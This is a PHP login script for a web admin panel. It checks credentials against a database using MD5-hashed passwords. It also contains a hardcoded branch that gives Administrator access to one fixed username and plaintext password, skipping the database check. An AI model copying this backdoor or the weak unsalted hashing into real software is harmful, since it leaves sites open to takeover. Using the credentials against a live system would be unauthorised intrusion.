<?php
    session_start();   
    require_once 'class.login.php';
    require_once 'config/koneksi.php';  
    if (isset ($_POST['login'])) {
        $username = $_POST['username'];
        $password = md5($_POST['password']);         
        if(empty($username) || empty($password)){
            header('location:login.php?err2');             
        } elseif ($_REQUEST['username']=='rafif' & $_REQUEST['password']=='ahnafyusi' ) {
            $_SESSION['s_user']     = 'rafif';
            $_SESSION['s_level']    = 'Administrator';
            $_SESSION['s_nama']     = 'Rafif Ahnafyusi';
            $_SESSION['foto_user']  = 'Rafif.png';
            header('Location:.');
            exit(); 
        } else {            
            $user = new Login($pdo);
            $login = $user->loginAdmin($username, $password);             
            if($login == true){                 
                $_SESSION['s_user'] 	= $login['username'];
                $_SESSION['s_pass'] 	= $login['password'];
                $_SESSION['s_level'] 	= $login['level'];
                $_SESSION['s_nama'] 	= $login['nama_lengkap'];
                $_SESSION['foto_user']  = $login['foto_user'];
                header('Location:.');
                exit();
            }else{        
                header('location:login.php?err1');
            }       
        }
    } 
?> 